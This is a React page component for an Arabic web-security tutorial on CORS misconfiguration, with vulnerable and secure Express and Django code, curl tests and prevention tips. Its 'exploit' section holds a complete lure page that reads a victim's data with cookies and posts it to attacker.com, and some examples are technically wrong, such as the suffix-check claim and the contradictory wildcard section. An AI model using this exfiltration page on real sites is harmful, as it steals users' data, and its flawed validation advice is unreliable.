import Link from 'next/link'
import VideoSection from '@/components/VideoSection'

export default function CorsPage() {
  return (
    <div className="max-w-4xl mx-auto prose prose-lg" dir="rtl">
      {/* Hero Section */}
      <section className="mb-12">
        <div className="flex items-center gap-3 mb-4">
          <span className="text-5xl">&#x1F517;</span>
          <div>
            <h1 className="text-4xl font-bold text-gray-900 mb-0">خطأ في تكوين سياسة مشاركة الموارد</h1>
            <p className="text-xl text-gray-500 mt-1">CORS Misconfiguration</p>
          </div>
        </div>
        <div className="bg-danger-50 border border-danger-200 rounded-lg p-4 mb-6">
          <span className="inline-block bg-danger-600 text-white px-3 py-1 rounded-full text-sm font-medium mb-2">
            خطيرة
          </span>
          <p className="text-gray-700 mb-0">
            ثغرة أمنية تسمح للمهاجم بإجراء طلبات عبر المواقع (Cross-Site) إلى خادمك، مما قد يؤدي لسرقة بيانات المستخدمين أو تشويهها. تُعد من أكثر الثغرات شيوعاً في تطبيقات الويب الحديثة التي تعتمد على واجهات API.
          </p>
        </div>
      </section>

      {/* Definition Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">تعريف سياسة مشاركة الموارد (CORS)</h2>
        <p>
          سياسة مشاركة الموارد عبر المواقع (Cross-Origin Resource Sharing - CORS) هي آلية أمنية في المتصفحات تسمح للمواقع بالتحكم في كيفية وصول المواقع الأخرى إلى مواردها. تعمل كجدار حماية يمنع المواقع الجانية من قراءة بيانات المستخدم من مواقع أخرى.
        </p>
        <p>
          بدون CORS، يُمنع أي طلب AJAX من موقع <code>example.com</code> من الوصول إلى API على <code>api.other.com</code> بسبب سياسةSame-Origin Policy. CORS يسمح للمطور بتحديد أي المواقع يُسمح لها بالوصول.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`# كيف يعمل CORS في المتصفح
# المتصفح يُرسل Origin header مع كل طلب عبر المواقع:
Origin: https://example.com

# الخادم يُجيب بـ Access-Control-Allow-Origin:
Access-Control-Allow-Origin: https://example.com

# إذا تطابق الـ Origin مع القائمة المسموح بها، ينفذ المتصفح الطلب
# وإلا يحظر المتصفح الاستجابة ويمنع وصول JavaScript للبيانات`}</code></pre>
        </div>
        <p>
          تحدث ثغرة CORS Misconfiguration عندما يتم تكوين هذه السياسة بشكل خاطئ، مما يسمح للمواقع الجانية بالوصول غير المصرح به إلى البيانات أو واجهات API.
        </p>
      </section>

      {/* Types Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">أنواع خطأ تكوين CORS</h2>

        {/* Type 1: Reflect Origin */}
        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">1. عكس أي Origin (Reflect Any Origin)</h3>
          <p>
            الأخطر من الأنواع. يقوم الخادم بعكس قيمة الـ Origin الواردة في الطلب مباشرة في رأس <code>Access-Control-Allow-Origin</code> دون أي تحقق. هذا يعني أن أي موقع يمكنه الوصول إلى بيانات المستخدم.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# الخادم يعكس أي Origin يort
# الطلب من موقع المهاجم:
Origin: https://attacker.com

# الاستجابة من الخادم المصاب:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"username": "john", "email": "john@example.com", "ssn": "123-45-6789"}

# كود المهاجم (على attacker.com)
fetch('https://vulnerable-api.com/user/profile', {
  credentials: 'include'  // لإرسال الكوكيز
})
.then(response => response.json())
.then(data => {
  // المهاجم يحصل على بيانات المستخدم
  sendToAttacker(data);
});`}</code></pre>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-3 mb-4">
            <p className="text-sm text-danger-700 mb-0">
              <strong>المشكلة:</strong> الكود يتحقق من وجود الـ Origin ولا يتحقق من قيمته، مما يسمح لأي موقع بالوصول.
            </p>
          </div>
        </div>

        {/* Type 2: Null Origin */}
        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">2. قبول Null Origin</h3>
          <p>
            بعض الخوادم تقبل <code>Origin: null</code> كعنوان مسموح به. يمكن للمهاجم حقن هذا القيمة عبر عناصر iframe مختلية أو تطبيقات محلية، مما يسمح بتجاوز CORS.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# الخادم يقبل Null Origin:
Origin: null

# الاستجابة:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# طريقة المهاجم لإرسال Origin: null
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://vulnerable-api.com/user/data', {
      credentials: 'include'
    })
    .then(r => r.json())
    .then(data => parent.postMessage(JSON.stringify(data), '*'));
  </script>
"></iframe>`}</code></pre>
          </div>
        </div>

        {/* Type 3: Wildcard Origin */}
        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">3. استخدام Wildcard (*)</h3>
          <p>
            استخدام <code>Access-Control-Allow-Origin: *</code> يسمح لأي موقع بالوصول إلى الموارد. هذا خطر بشكل خاص عند استخدام <code>Access-Control-Allow-Credentials: true</code> معًا، لأن المتصفح يحظر هذا التكوين.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# Wildcard - يسمح لأي موقع للقراءة (بدون كوكيز):
Access-Control-Allow-Origin: *

# ⚠️ هذا التكوين غير صالح عند استخدام credentials:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# المتصفح يرفض هذا التكوين ويعطل الطلب

# استغلال Wildcard بدون credentials:
# يمكن للمهاجم قراءة البيانات العامة لكن بدون كوكيز المستخدم`}</code></pre>
          </div>
        </div>

        {/* Type 4: Subdomain Misconfiguration */}
        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">4. خطأ تكوين النطاقات الفرعية (Subdomain Misconfiguration)</h3>
          <p>
            السماح بالنطاقات الفرعية بشكل عام بدلاً من تحديد نطاقات محددة. يمكن للمهاجم إنشاء موقع على نطاق فرعي مصاب للوصول إلى البيانات.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# الكود يتحقق من أن الـ Origin ينتهي بـ .example.com
const origin = req.headers.origin;
if (origin.endsWith('.example.com')) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}

# المشكلة: المهاجم يمكنه استخدام attacker-example.com
# لأن "attacker-example.com" ينتهي بـ ".example.com"

# الحل: استخدام مطابقة دقيقة
ALLOWED_ORIGINS = [
  'https://app.example.com',
  'https://api.example.com',
  'https://admin.example.com'
]`}</code></pre>
          </div>
        </div>

        {/* Type 5: Trusted Prefix */}
        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">5. الثقة في البادئات (Trusted Prefix)</h3>
          <p>
            استخدام startsWith للتحقق من أن الـ Origin يبدأ بنطاق محدد دون مراعاة التحقق من البادئات المخصصة.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# كود ضعيف - لا يتحقق من البادئة المخصصة:
const origin = req.headers.origin;
if (origin.startsWith('https://example.com')) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}

# المشكلة: المهاجم يمكنه استخدام:
# https://example.com.attacker.com
# لأنها تبدأ بـ "https://example.com"

# الحل: التحقق من البادئة المخصصة مع /
if (origin === 'https://example.com' || 
    origin.startsWith('https://example.com/')) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}`}</code></pre>
          </div>
        </div>

        {/* Type 6: Wildcard with Credentials */}
        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">6. Wildcard مع الكوكيز (Credentials Mode)</h3>
          <p>
            استخدام Wildcard مع تمكين الكوكيز (credentials) يسمح للمهاجم بسرقة بيانات المستخدم عبر طلبات عبر المواقع.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# خادم مصاب:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# كود المهاجم
fetch('https://vulnerable-api.com/user/profile', {
  credentials: 'include'  // يرسل الكوكيز مع الطلب
})
.then(r => r.json())
.then(data => {
  // المهاجم يحصل على بيانات المستخدم مع الكوكيز
  // يمكنه استخدام هذه البيانات لتسجيل الدخول
  sendToAttacker(data);
});`}</code></pre>
          </div>
        </div>
      </section>

      {/* Real-world Examples */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">أمثلة حقيقية على الأكواد</h2>

        <h3 className="text-2xl font-semibold text-gray-800">مثال 1: خادم Express.js مصاب</h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          {/* Vulnerable Code */}
          <div>
            <h4 className="text-lg font-semibold text-danger-700 mb-3">كود مصاب</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`// Node.js Express - كود مصاب
const express = require('express');
const app = express();

// إعداد CORS بشكل خاطئ
app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // مشكلة 1: عكس أي Origin
  if (origin) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  
  // مشكلة 2: السماح بالكوكيز
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  // مشكلة 3: السماح بجميع الطرق
  res.setHeader('Access-Control-Allow-Methods', '*');
  
  // مشكلة 4: السماح بجميع الرؤوس
  res.setHeader('Access-Control-Allow-Headers', '*');
  
  next();
});

app.get('/api/user/profile', (req, res) => {
  // بيانات حساسة
  res.json({
    name: req.user.name,
    email: req.user.email,
    ssn: req.user.ssn
  });
});`}</code></pre>
            </div>
          </div>

          {/* Secure Code */}
          <div>
            <h4 className="text-lg font-semibold text-success-700 mb-3">كود آمن</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`// Node.js Express - كود آمن
const express = require('express');
const app = express();

// قائمة المسموحات
const ALLOWED_ORIGINS = [
  'https://app.example.com',
  'https://admin.example.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // التحقق من القائمة المسموح بها
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  }
  
  next();
});

// حماية المسارات الحساسة
app.get('/api/user/profile', authenticate, (req, res) => {
  res.json({
    name: req.user.name,
    email: req.user.email
    // لا تُرسل بيانات حساسة مثل SSN
  });
});`}</code></pre>
            </div>
          </div>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">مثال 2: خادم Python Django مصاب</h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <div>
            <h4 className="text-lg font-semibold text-danger-700 mb-3">كود مصاب</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`# Python Django - كود مصاب
# views.py
from django.http import JsonResponse

def user_api(request):
    # لا يوجد تحقق من Origin
    response = JsonResponse({
        'name': request.user.name,
        'email': request.user.email,
        'api_key': request.user.api_key
    })
    
    # إعداد CORS بشكل خاطئ
    origin = request.META.get('HTTP_ORIGIN', '')
    response['Access-Control-Allow-Origin'] = origin
    response['Access-Control-Allow-Credentials'] = 'true'
    
    return response`}</code></pre>
            </div>
          </div>

          <div>
            <h4 className="text-lg font-semibold text-success-700 mb-3">كود آمن</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`# Python Django - كود آمن
# settings.py
CORS_ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://admin.example.com',
]
CORS_ALLOW_CREDENTIALS = True
CORS_ALLOW_METHODS = ['GET', 'POST']
CORS_ALLOW_HEADERS = ['Content-Type']

# أو استخدام django-cors-headers
INSTALLED_APPS = [
    ...
    'corsheaders',
]
MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',
    ...
]

# views.py - حماية إضافية
from django.http import JsonResponse

def user_api(request):
    if not request.user.is_authenticated:
        return JsonResponse({'error': 'Unauthorized'}, status=401)
    
    return JsonResponse({
        'name': request.user.name,
        'email': request.user.email
    })`}</code></pre>
            </div>
          </div>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">مثال 3: كود المهاجم (Exploit)</h3>

        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`// صفحة هجومية على attacker.com
<!DOCTYPE html>
<html>
<head>
  <title>صفحة مصيدة</title>
</head>
<body>
  <h1>مرحباً! اضغط على الزر للحصول على هدية مجانية</h1>
  <button onclick="stealData()">احصل على الهدية</button>
  <div id="result"></div>

  <script>
    async function stealData() {
      try {
        // الطلب إلى API المصاب
        const response = await fetch('https://vulnerable-site.com/api/user', {
          method: 'GET',
          credentials: 'include'  // لإرسال الكوكيز
        });
        
        const userData = await response.json();
        
        // إرسال البيانات إلى الخادم الخاص بالمهاجم
        await fetch('https://attacker.com/collect', {
          method: 'POST',
          body: JSON.stringify(userData)
        });
        
        document.getElementById('result').innerHTML = 
          'تم بنجاح! شكراً لك';
      } catch (error) {
        console.error('Error:', error);
      }
    }
  </script>
</body>
</html>`}</code></pre>
        </div>
      </section>

      {/* Detection Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">كيف تكتشف ثغرة CORS</h2>

        <h3 className="text-2xl font-semibold text-gray-800">علامات وجود الثغرة</h3>
        <ul>
          <li>الخادم يعكس أي Origin في رأس <code>Access-Control-Allow-Origin</code></li>
          <li>الخادم يقبل <code>Origin: null</code></li>
          <li>استخدام <code>Access-Control-Allow-Origin: *</code> مع الكوكيز</li>
          <li>استخدام Wildcard في <code>Access-Control-Allow-Methods</code> و <code>Access-Control-Allow-Headers</code></li>
          <li>السماح بالنطاقات الفرعية بشكل عام بدون تحقق دقيق</li>
        </ul>

        <h3 className="text-2xl font-semibold text-gray-800">أدوات الاكتشاف</h3>
        <ul>
          <li><strong>Burp Suite:</strong> منصة شاملة لاختبار أمن التطبيقات مع اختبارات CORS مخصصة</li>
          <li><strong>OWASP ZAP:</strong> أداة مجانية لاكتشاف ثغرات CORS</li>
          <li><strong>CORScanner:</strong> أداة متخصصة لاكتشاف ثغرات CORS</li>
          <li><strong>corsy:</strong> أداة آلية لفحص إعدادات CORS</li>
        </ul>

        <h3 className="text-2xl font-semibold text-gray-800">اختبار يدوی باستخدام curl</h3>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`# اختبار عكس أي Origin
curl -H "Origin: https://attacker.com" -I https://vulnerable-api.com/user

# اختبار Null Origin
curl -H "Origin: null" -I https://vulnerable-api.com/user

# اختبار Wildcard
curl -H "Origin: https://attacker.com" -I https://vulnerable-api.com/user

# اختبار النطاقات الفرعية
curl -H "Origin: https://evil.example.com" -I https://vulnerable-api.com/user

# اختبار البادئات المخصصة
curl -H "Origin: https://example.com.attacker.com" -I https://vulnerable-api.com/user

# اختبار استخدام HTTP بدلاً من HTTPS
curl -H "Origin: http://example.com" -I https://vulnerable-api.com/user`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">نص JavaScript للاختبار السريع</h3>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`// اختبار CORS يدوياً من وحدة التحكم في المتصفح
// افتح وحدة التحكم (F12) وألصق هذا الكود

// اختبار 1: عكس أي Origin
async function testCorsReflect() {
  try {
    const response = await fetch('https://TARGET-URL/api/data', {
      credentials: 'include'
    });
    const data = await response.json();
    console.log('CORS Reflect Test:', data);
  } catch (e) {
    console.log('CORS Block:', e.message);
  }
}

// اختبار 2: Null Origin
async function testCorsNull() {
  try {
    const response = await fetch('https://TARGET-URL/api/data', {
      mode: 'no-cors'  // هذا يرسل Origin: null في بعض الحالات
    });
    console.log('Null Origin Test:', response.status);
  } catch (e) {
    console.log('Null Origin Block:', e.message);
  }
}

// اختبار 3: قراءة الاستجابة مع CORS
async function testCorsRead() {
  try {
    const response = await fetch('https://TARGET-URL/api/data');
    if (response.headers.get('Access-Control-Allow-Origin')) {
      console.log('CORS Enabled - Origin:', 
        response.headers.get('Access-Control-Allow-Origin'));
    }
  } catch (e) {
    console.log('CORS Block:', e.message);
  }
}`}</code></pre>
        </div>
      </section>

      {/* Prevention Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">كيف تمنع ثغرة CORS</h2>

        <h3 className="text-2xl font-semibold text-gray-800">1. استخدام قائمة مسموحات (Allow List)</h3>
        <p>
          حدد النطاقات المسموح لها بالوصول بدلاً من السماح لأي موقع. تحقق من الـ Origin بشكل دقيق ومطابقة حرفية.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`// مثال على Allow List في Node.js
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
  'https://api.example.com'
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // مطابقة حرفية فقط
  if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});

// لا تستخدم this:
// if (origin.endsWith('.example.com')) // خاطئ
// if (origin.includes('example.com')) // خاطئ
// if (origin.startsWith('https://example.com')) // خاطئ`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">2. تجنب استخدام Wildcard (*)</h3>
        <p>
          استخدام <code>Access-Control-Allow-Origin: *</code> يسمح لأي موقع بالوصول. استخدمه فقط للموارد العامة التي لا تحتوي على بيانات حساسة.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`# بدلاً من هذا (خاطئ):
Access-Control-Allow-Origin: *

# استخدم هذا (آمن):
Access-Control-Allow-Origin: https://app.example.com

# أو استخدم نمط ديناميكي محدد:
const ALLOWED_ORIGINS = new Set([...]);
if (ALLOWED_ORIGINS.has(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">3. تقييد الطرق والرؤوس المسموح بها</h3>
        <p>
          لا تستخدم Wildcard في <code>Access-Control-Allow-Methods</code> و <code>Access-Control-Allow-Headers</code>. حدد الطرق والرؤوس المطلوبة فقط.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`// خاطئ - استخدام Wildcard
res.setHeader('Access-Control-Allow-Methods', '*');
res.setHeader('Access-Control-Allow-Headers', '*');

// آمن - تحديد محدد
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">4. استخدام مكتبات مخصصة</h3>
        <p>
          استخدم مكتبات مخصصة لإدارة CORS بدلاً من الكود اليدوي.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`# Python Django - استخدام django-cors-headers
pip install django-cors-headers

# settings.py
INSTALLED_APPS = [
    'corsheaders',
]
MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',
]
CORS_ALLOWED_ORIGINS = [
    'https://app.example.com',
]
CORS_ALLOW_CREDENTIALS = True
CORS_ALLOW_METHODS = ['GET', 'POST']

# Node.js - استخدام مكتبة cors
npm install cors

const cors = require('cors');
app.use(cors({
  origin: ['https://app.example.com'],
  credentials: true,
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type']
}));`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">5. التحقق من الـ Origin بشكل صارم</h3>
        <p>
          تحقق من الـ Origin بشكل صارم وتجنب التحقق غير الصارم مثل endsWith أو includes.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`// تحقق صارم من Origin
function isAllowedOrigin(origin) {
  if (!origin) return false;
  
  // مطابقة حرفية فقط
  const allowed = [
    'https://app.example.com',
    'https://api.example.com'
  ];
  
  return allowed.includes(origin);
}

// لا تستخدم هذا أبداً:
// origin.includes('example.com')      // خاطئ
// origin.endsWith('.example.com')     // خاطئ
// origin.startsWith('https://example') // خاطئ`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">6. استخدام HTTPS دائماً</h3>
        <p>
          ارفض طلبات HTTP واسمح فقط بـ HTTPS لمنع هجمات التنصت.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`// التحقق من استخدام HTTPS
function isSecureOrigin(origin) {
  if (!origin) return false;
  return origin.startsWith('https://');
}

// رفض HTTP
if (!isSecureOrigin(origin)) {
  return res.status(403).json({ error: 'Insecure origin' });
}`}</code></pre>
        </div>
      </section>

      {/* Security Tips */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">نصائح أمنية مهمة</h2>

        <div className="bg-success-50 border border-success-200 rounded-lg p-6 mb-6">
          <div className="flex items-start gap-3">
            <span className="text-2xl">&#x2705;</span>
            <div>
              <h4 className="font-bold text-success-800 mb-2">القاعدة الذهبية</h4>
              <p className="mb-0 text-success-700">
                لا تسمح أبداً بأي Origin عشوائي. استخدم قائمة مسموحات محددة وثبتها في الكود. لا تعتمد على مدخلات المستخدم للتحقق من Origin.
              </p>
            </div>
          </div>
        </div>

        <ul className="space-y-3">
          <li className="flex items-start gap-2">
            <span className="text-success-600 mt-1">&#x2714;</span>
            <span><strong>استخدم Allow List دائماً:</strong> حدد النطاقات المسموح بها بدلاً من السماح لأي موقع</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-success-600 mt-1">&#x2714;</span>
            <span><strong>تحقق من الـ Origin بشكل دقيق:</strong> استخدم المطابقة الحرفية فقط (includes أو endsWith خاطئ)</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-success-600 mt-1">&#x2714;</span>
            <span><strong>لا تستخدم Wildcard (*):</strong> إلا للموارد العامة تماماً بدون بيانات حساسة</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-success-600 mt-1">&#x2714;</span>
            <span><strong>قيّد الطرق والرؤوس:</strong> حدد فقط ما هو ضروري لعمل تطبيقك</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-success-600 mt-1">&#x2714;</span>
            <span><strong>استخدم HTTPS دائماً:</strong> ارفض طلبات HTTP لمنع التنصت</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-success-600 mt-1">&#x2714;</span>
            <span><strong>لا تعتمد على مكتبات CORS الجاهزة blindly:</strong> راجع إعداداتها وتأكد من تكوينها بشكل صحيح</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-success-600 mt-1">&#x2714;</span>
            <span><strong>راجع الكود بشكل دوري:</strong> تأكد من أن إعدادات CORS لم تتغير بشكل غير متوقع</span>
          </li>
        </ul>
      </section>

      {/* Common Mistakes */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">الأخطاء الشائعة التي يجب تجنبها</h2>

        <div className="space-y-4">
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">عكس أي Origin دون تحقق</h4>
            <p className="text-danger-700 mb-0">
              استخدام الكود الذي يعكس أي Origin في رأس <code>Access-Control-Allow-Origin</code> هو خطأ شائع وخطير. يجب التحقق من القائمة المسموح بها دائماً.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">قبول Null Origin</h4>
            <p className="text-danger-700 mb-0">
              السماح بـ <code>Origin: null</code> يسمح للمهاجم بتجاوز CORS عبر عناصر iframe مختلية أو تطبيقات محلية.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">استخدام Wildcard مع الكوكيز</h4>
            <p className="text-danger-700 mb-0">
              استخدام <code>Access-Control-Allow-Origin: *</code> مع <code>Access-Control-Allow-Credentials: true</code> يسمح للمهاجم بسرقة بيانات المستخدم عبر طلبات عبر المواقع.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">التحقق غير الصارم من النطاقات الفرعية</h4>
            <p className="text-danger-700 mb-0">
              استخدام <code>endsWith('.example.com')</code> يسمح للمهاجم باستخدام <code>attacker-example.com</code> للوصول إلى البيانات.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">عدم استخدام HTTPS</h4>
            <p className="text-danger-700 mb-0">
              السماح بطلبات HTTP يعرض البيانات للتنصت أثناء النقل. يجب أن يكون كل الاتصالات عبر HTTPS.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">استخدام Wildcard في Methods و Headers</h4>
            <p className="text-danger-700 mb-0">
              استخدام <code>Access-Control-Allow-Methods: *</code> و <code>Access-Control-Allow-Headers: *</code> يوسع مساحة الهجوم بشكل غير ضروري.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">عدم معالجة طلبات OPTIONS</h4>
            <p className="text-danger-700 mb-0">
              عدم معالجة طلبات Preflight (OPTIONS) بشكل صحيح قد يسبب أخطاء في CORS ويعطل الوظائف المشروعة.
            </p>
          </div>
        </div>
      </section>

      {/* Severity Impact */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">تأثير الثغرة ومدى خطورتها</h2>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 text-center">
            <div className="text-4xl mb-3">&#x1F534;</div>
            <h4 className="font-bold text-danger-800 mb-2">التأثير على السرية</h4>
            <p className="text-danger-700 mb-0">مرتفع جداً - سرقة بيانات المستخدمين والكوكيز عبر المواقع</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 text-center">
            <div className="text-4xl mb-3">&#x1F7E0;</div>
            <h4 className="font-bold text-danger-800 mb-2">التأثير على النزاهة</h4>
            <p className="text-danger-700 mb-0">متوسط إلى مرتفع - تعديل البيانات عبر طلبات عبر المواقع</p>
          </div>
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 text-center">
            <div className="text-4xl mb-3">&#x1F7E2;</div>
            <h4 className="font-bold text-gray-800 mb-2">التأثير على التوفر</h4>
            <p className="text-gray-700 mb-0">منخفض - عادة لا يؤثر على توفر الخدمة مباشرة</p>
          </div>
        </div>

        <blockquote className="border-r-4 border-warning-500 pr-4 italic text-gray-600 my-6">
          وفقاً لـ OWASP، تُعد ثغرات CORS Misconfiguration من أكثر الثغرات شيوعاً في تطبيقات الويب الحديثة. أثرت على منصات كبرى مثل Starbucks و Microsoft و Uber. في عام 2024، تم اكتشاف أكثر من 10,000 ثغرة CORS في مواقع الويب العامة.
        </blockquote>
      </section>

      <VideoSection slug="cors" />

      {/* Navigation Section */}
      <section className="mt-16">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">أنواع أخرى من الثغرات</h2>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Link
            href="/vulnerabilities/xss"
            className="block bg-white border border-gray-200 rounded-lg p-4 hover:shadow-lg transition-all hover:border-primary-300"
          >
            <span className="text-2xl block mb-2">&#x1F4DC;</span>
            <h4 className="font-bold text-gray-900 mb-1">XSS</h4>
            <p className="text-sm text-gray-600 mb-0">برمجة النصوص بين المواقع</p>
          </Link>
          <Link
            href="/vulnerabilities/csrf"
            className="block bg-white border border-gray-200 rounded-lg p-4 hover:shadow-lg transition-all hover:border-primary-300"
          >
            <span className="text-2xl block mb-2">&#x1F3A3;</span>
            <h4 className="font-bold text-gray-900 mb-1">CSRF</h4>
            <p className="text-sm text-gray-600 mb-0">تزوير الطلبات بين المواقع</p>
          </Link>
          <Link
            href="/vulnerabilities/ssrf"
            className="block bg-white border border-gray-200 rounded-lg p-4 hover:shadow-lg transition-all hover:border-primary-300"
          >
            <span className="text-2xl block mb-2">&#x1F5A5;&#xFE0F;</span>
            <h4 className="font-bold text-gray-900 mb-1">SSRF</h4>
            <p className="text-sm text-gray-600 mb-0">تزوير الطلبات من جانب الخادم</p>
          </Link>
        </div>
        <div className="text-center mt-6">
          <Link
            href="/"
            className="inline-block bg-primary-600 text-white px-6 py-3 rounded-lg font-semibold hover:bg-primary-700 transition-colors"
          >
            العودة للرئيسية
          </Link>
        </div>
      </section>
    </div>
  )
}